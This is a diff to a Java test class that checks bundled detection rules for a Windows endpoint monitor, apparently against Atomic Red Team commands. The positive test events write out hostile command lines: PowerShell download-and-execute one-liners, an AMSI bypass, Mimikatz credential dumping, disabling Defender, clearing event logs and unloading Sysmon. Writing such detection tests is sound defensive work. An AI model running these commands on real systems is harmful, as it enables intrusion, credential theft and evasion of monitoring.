@@ -39,6 +39,14 @@ class BundledRulesTest {
         return TestEvents.of("h", EventTypes.SCRIPT, 1, image, "explorer.exe", cmdline, null, 0, null, null, null, "t");
     }
 
+    private static Event procFrom(String parent, String image, String cmdline) {
+        return TestEvents.of("h", EventTypes.PROCESS, 1, image, parent, cmdline, null, 0, null, null, null, "t");
+    }
+
+    private static Event scriptFrom(String parent, String image, String cmdline) {
+        return TestEvents.of("h", EventTypes.SCRIPT, 1, image, parent, cmdline, null, 0, null, null, null, "t");
+    }
+
     private static Event file(String path) {
         String name = path.substring(path.lastIndexOf('\\') + 1);
         return TestEvents.of("h", EventTypes.FILE, 1, name, null, path, null, 0, null, "{\"action\":\"CREATE\"}", null, "t");
@@ -50,12 +58,13 @@ class BundledRulesTest {
 
     private static final String SYS = "C:\\Windows\\System32\\";
     private static final String PS = SYS + "WindowsPowerShell\\v1.0\\powershell.exe ";
+    private static final String WMIC = SYS + "wbem\\WMIC.exe ";
 
     private static Case c(String id, String severity, List<Event> pos, List<Event> neg) {
         return new Case(id, severity, pos, neg);
     }
 
-    static final List<Case> CASES = List.of(
+    private static final List<Case> BASE_CASES = List.of(
             c("MIMIKATZ_COMMAND_LINE", Alert.SEV_HIGH,
                     List.of(proc("mimikatz.exe", "C:\\Tools\\mimikatz.exe privilege::debug sekurlsa::logonpasswords"),
                             proc("a.exe", "C:\\Temp\\a.exe lsadump::sam"),
@@ -173,6 +182,120 @@ class BundledRulesTest {
                     List.of(file("C:\\Temp\\lsass.dmp"), file("C:\\Temp\\lsass_261110_101010.dmp")),
                     List.of(file("C:\\Temp\\report.dmp"))));
 
+    // 아래 룰의 양성은 Atomic Red Team 시험 명령(기본 입력값 대입)이다. powershell 실행자 시험은 powershell.exe -NoProfile -Command "..." 로 감쌌다.
+    // ART 시험 번호는 룰 파일 맨 위 주석에 있다. 에이전트는 명령행 첫 토큰을 전체 경로로 바꿔 보낸다.
+    private static final List<Case> ART_CASES = List.of(
+            c("POWERSHELL_SUSP_DOWNLOAD_PATTERNS", Alert.SEV_MEDIUM,
+                    List.of(script("powershell.exe", PS + "\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\"")),
+                    List.of(script("powershell.exe", PS + "-Command \"(New-Object Net.WebClient).DownloadString('https://example.com/readme.txt')\""),
+                            script("powershell.exe", PS + "-File C:\\scripts\\backup.ps1"))),
+            c("POWERSHELL_DOWNLOAD_PATTERNS", Alert.SEV_MEDIUM,
+                    List.of(script("powershell.exe", PS + "-NoProfile -Command \"(New-Object System.Net.WebClient).DownloadFile(\\\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\\\", \\\"$env:TEMP\\Atomic-license.txt\\\")\""),
+                            script("powershell.exe", PS + "-NoProfile -Command \"(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt\"")),
+                    List.of(script("powershell.exe", PS + "-Command \"Invoke-WebRequest https://example.com/api\""),
+                            script("powershell.exe", PS + "-Command \"Get-ChildItem C:\\temp\""),
+                            script("cmd.exe", SYS + "cmd.exe /c echo (New-Object Net.WebClient).DownloadString('x')"))),
+            c("POWERSHELL_FROMBASE64STRING", Alert.SEV_MEDIUM,
+                    List.of(script("powershell.exe", PS + "-Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\\Microsoft\\Windows\\CurrentVersion Debug).Debug)))\"")),
+                    List.of(script("powershell.exe", PS + "-File C:\\scripts\\decode.ps1"),
+                            script("powershell.exe", PS + "-Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('a.bin'))\""))),
+            c("POWERSHELL_BASE64_INVOKE", Alert.SEV_MEDIUM,
+                    List.of(script("powershell.exe", PS + "-exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA")),
+                    List.of(script("powershell.exe", PS + "-e JABzAD0ATgBlAHcA"),
+                            script("powershell.exe", PS + "-File C:\\scripts\\backup.ps1"),
+                            script("cmd.exe", SYS + "cmd.exe /c echo -e SQBuAHYAbwBrAGUALQBX"))),
+            c("CMD_STDIN_REDIRECT", Alert.SEV_MEDIUM,
+                    List.of(script("cmd.exe", SYS + "cmd.exe /r cmd<\"C:\\AtomicRedTeam\\atomics\\T1059.003\\src\\t1059.003_cmd.cmd\"")),
+                    List.of(script("cmd.exe", SYS + "cmd.exe /c echo \"Hello from the Windows Command Prompt!\" > C:\\temp\\test.bin & type C:\\temp\\test.bin"),
+                            proc("sort.exe", SYS + "sort.exe < C:\\temp\\a.txt"))),
+            c("CURL_SUSP_DOWNLOAD", Alert.SEV_MEDIUM,
+                    List.of(proc("Curl.exe", SYS + "Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\\users\\public\\music\\allthethingsx64.dll")),
+                    List.of(proc("curl.exe", SYS + "curl.exe -s https://example.com/health"),
+                            proc("curl.exe", SYS + "curl.exe https://example.com/a.zip -o D:\\work\\a.zip"),
+                            // 원본의 git for windows 필터: 부모 sh.exe, 임시 파일 gfw-httpget-
+                            procFrom("sh.exe", "curl.exe", "C:\\Program Files\\Git\\mingw64\\bin\\curl.exe --silent --show-error --output C:\\Users\\a\\AppData\\Local\\Temp\\gfw-httpget-abc.txt https://example.com/v.txt"))),
+            c("MPCMDRUN_DOWNLOAD_ARBITRARY_FILE", Alert.SEV_MEDIUM,
+                    List.of(proc("MpCmdRun.exe", "C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.2410.7-0\\MpCmdRun.exe -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path C:\\Users\\a\\AppData\\Local\\Temp\\Atomic-license.txt")),
+                    List.of(proc("MpCmdRun.exe", "C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.2410.7-0\\MpCmdRun.exe -Scan -ScanType 1"))),
+            c("POWERSHELL_INVOKE_WEBREQUEST_DOWNLOAD", Alert.SEV_MEDIUM,
+                    List.of(script("powershell.exe", PS + "iwr -URI https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile %temp%\\Atomic-license.txt -UseBasicParsing")),
+                    List.of(script("powershell.exe", PS + "Invoke-WebRequest https://example.com/api -UseBasicParsing"),
+                            script("powershell.exe", PS + "iwr -Uri https://example.com/a.zip -OutFile D:\\work\\a.zip"))),
+            c("FINGER_EXECUTION", Alert.SEV_MEDIUM,
+                    List.of(proc("finger.exe", SYS + "finger.exe base64_filedata@localhost")),
+                    List.of(proc("fingerprint.exe", "C:\\Tools\\fingerprint.exe --scan"),
+                            proc("xfinger.exe", "C:\\Tools\\xfinger.exe user@host"))),
+            c("WMIC_PROCESS_CREATION", Alert.SEV_MEDIUM,
+                    List.of(proc("wmic.exe", WMIC + "process call create notepad.exe")),
+                    List.of(proc("wmic.exe", WMIC + "process get caption,executablepath,commandline /format:csv"),
+                            proc("wmic.exe", WMIC + "os get caption"))),
+            c("WMIC_SUSP_PROCESS_CREATION", Alert.SEV_MEDIUM,
+                    List.of(proc("wmic.exe", WMIC + "/node:127.0.0.1 process call create \"rundll32.exe \\\"C:\\AtomicRedTeam\\ExternalPayloads\\calc.dll\\\" StartW\"")),
+                    List.of(proc("wmic.exe", WMIC + "process call create notepad.exe"),
+                            proc("wmic.exe", WMIC + "qfe get description,installedOn /format:csv"))),
+            c("WMIC_NAMESPACE_DEFENDER", Alert.SEV_MEDIUM,
+                    List.of(proc("wmic.exe", WMIC + "/Namespace:\\\\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Add ExclusionPath=\\\"ATOMICREDTEAM\\\"")),
+                    List.of(proc("wmic.exe", WMIC + "/Namespace:\\\\root\\cimv2 path Win32_OperatingSystem get Caption"),
+                            proc("wmic.exe", WMIC + "useraccount get /ALL /format:csv"))),
+            c("CLICKFIX_RUN_DIALOG_SHELL", Alert.SEV_MEDIUM,
+                    List.of(script("powershell.exe", PS + "-w hidden -c \"iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1204.004/src/evil.ps1'))\""),
+                            script("powershell.exe", PS + "-NoP -W Hidden -Command \"irm https://203.0.113.9/v | iex\""),
+                            script("powershell.exe", PS + "-w hidden -c \"& 'C:\\Users\\a\\AppData\\Local\\Temp\\a.exe'\""),
+                            script("mshta.exe", SYS + "mshta.exe https://203.0.113.9/captcha.hta"),
+                            script("cmd.exe", SYS + "cmd.exe /c start /min powershell -w hidden -c iwr https://203.0.113.9/a.ps1")),
+                    List.of(script("powershell.exe", PS + "-ExecutionPolicy Bypass -File C:\\scripts\\deploy.ps1"),
+                            script("powershell.exe", PS + "-WindowStyle Hidden -File C:\\tools\\tray.ps1"),
+                            script("mshta.exe", SYS + "mshta.exe C:\\apps\\local.hta"),
+                            script("cmd.exe", SYS + "cmd.exe /c dir C:\\"),
+                            // 같은 명령이라도 부모가 explorer.exe 가 아니면 걸지 않는다(스크립트 안에서 쓰는 정상 다운로드 포함)
+                            scriptFrom("code.exe", "powershell.exe", PS + "-w hidden -c \"iex ((New-Object System.Net.WebClient).DownloadString('https://example.com/x.ps1'))\""),
+                            scriptFrom("cmd.exe", "mshta.exe", SYS + "mshta.exe https://203.0.113.9/captcha.hta"))),
+            c("POWERSHELL_AMSI_INIT_FAILED_BYPASS", Alert.SEV_MEDIUM,
+                    List.of(script("powershell.exe", PS + "-NoProfile -Command \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\"")),
+                    List.of(script("powershell.exe", PS + "-Command \"[Ref].Assembly.GetType('System.Management.Automation.Foo')\""),
+                            script("powershell.exe", PS + "-File C:\\scripts\\amsi-check.ps1"))),
+            c("MPCMDRUN_REMOVE_DEFINITIONS", Alert.SEV_MEDIUM,
+                    List.of(proc("MpCmdRun.exe", "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All")),
+                    List.of(proc("MpCmdRun.exe", "C:\\Program Files\\Windows Defender\\MpCmdRun.exe -SignatureUpdate"),
+                            proc("MpCmdRun.exe", "C:\\Program Files\\Windows Defender\\MpCmdRun.exe -RemoveDefinitions -DynamicSignatures"))),
+            c("DEFENDER_DISABLE_MONITORING", Alert.SEV_MEDIUM,
+                    List.of(proc("sc.exe", SYS + "sc.exe stop WinDefend"),
+                            proc("sc.exe", SYS + "sc.exe config WinDefend start=disabled"),
+                            script("powershell.exe", PS + "Set-MpPreference -DisableBehaviorMonitoring $true")),
+                    List.of(proc("sc.exe", SYS + "sc.exe query WinDefend"),
+                            proc("sc.exe", SYS + "sc.exe stop Spooler"),
+                            script("powershell.exe", PS + "Set-MpPreference -DisableBehaviorMonitoring $false"))),
+            c("REG_BITLOCKER_POLICY", Alert.SEV_MEDIUM,
+                    // ART 에서는 T1112 아래의 BitLocker 레지스트리 시험(Modify EnableBDEWithNoTPM Registry entry)
+                    List.of(proc("reg.exe", SYS + "reg.exe add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f")),
+                    List.of(proc("reg.exe", SYS + "reg.exe query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\""),
+                            proc("reg.exe", SYS + "reg.exe add HKLM\\SOFTWARE\\Vendor\\App /v UseTPM /t REG_DWORD /d 1 /f"))),
+            c("GPG_BATCH_ENCRYPT", Alert.SEV_MEDIUM,
+                    List.of(proc("gpg.exe", "C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe --passphrase 'SomeParaphraseBlah' --batch --yes -c \"C:\\Users\\a\\AppData\\Local\\Temp\\test.txt\"")),
+                    List.of(proc("gpg.exe", "C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe --status-fd=2 -bsau ABCD1234EF567890"),
+                            proc("gpg.exe", "C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe --batch --yes --decrypt C:\\a\\b.gpg"),
+                            proc("gpg.exe", "C:\\Program Files (x86)\\GnuPG\\bin\\gpg.exe --list-keys"))),
+            c("FSUTIL_USAGE", Alert.SEV_MEDIUM,
+                    List.of(proc("fsutil.exe", SYS + "fsutil.exe usn deletejournal /D C:"),
+                            proc("fsutil.exe", SYS + "fsutil.exe  file setZeroData offset=0 length=10 C:\\ExternalPayloads\\T1070-2.txt")),
+                    List.of(proc("fsutil.exe", SYS + "fsutil.exe volume diskfree C:"),
+                            proc("fsutil.exe", SYS + "fsutil.exe usn queryjournal C:"))),
+            c("EVENTLOG_CLEAR", Alert.SEV_MEDIUM,
+                    List.of(proc("wevtutil.exe", SYS + "wevtutil.exe cl System"),
+                            proc("wevtutil.exe", SYS + "wevtutil.exe cl \"Application\""),
+                            script("powershell.exe", PS + "-NoProfile -Command \"Get-EventLog -List | ForEach-Object {Clear-EventLog -LogName $_.Log}\"")),
+                    List.of(proc("wevtutil.exe", SYS + "wevtutil.exe qe System /c:5 /f:text"),
+                            proc("wevtutil.exe", SYS + "wevtutil.exe el"),
+                            script("powershell.exe", PS + "Get-EventLog -List"),
+                            // 원본의 msiexec 필터: 설치 프로그램이 로그 설정(sl)을 바꾸는 것
+                            procFrom("msiexec.exe", "wevtutil.exe", SYS + "wevtutil.exe sl Application /ms:20480"))),
+            c("FLTMC_UNLOAD_SYSMON", Alert.SEV_MEDIUM,
+                    List.of(proc("fltMC.exe", SYS + "fltmc.exe unload SysmonDrv")),
+                    List.of(proc("fltMC.exe", SYS + "fltmc.exe filters"),
+                            proc("fltMC.exe", SYS + "fltmc.exe unload MyAvFilter"))));
+
+    static final List<Case> CASES = Stream.concat(BASE_CASES.stream(), ART_CASES.stream()).toList();
+
     private static final Map<String, SigmaRule> BY_ID = BUNDLED.current().stream()
             .collect(Collectors.toMap(SigmaRule::ruleId, r -> r));
 
@@ -197,14 +320,14 @@ class BundledRulesTest {
     }
 
     @Test
-    @DisplayName("번들 룰은 전부 읽히고, 룰마다 테스트 케이스가 있다 (20~30개)")
+    @DisplayName("번들 룰은 전부 읽히고, 룰마다 테스트 케이스가 있다 (40~60개)")
     void everyBundledRule_isLoaded_andTested() throws IOException {
         int files = new PathMatchingResourcePatternResolver().getResources("classpath*:rules/*.yml").length;
         Set<String> tested = CASES.stream().map(Case::ruleId).collect(Collectors.toSet());
 
         assertThat(BUNDLED.current()).hasSize(files);
         assertThat(BY_ID.keySet()).isEqualTo(tested);
-        assertThat(files).isBetween(20, 30);
+        assertThat(files).isBetween(40, 60);
     }
 
     @Test
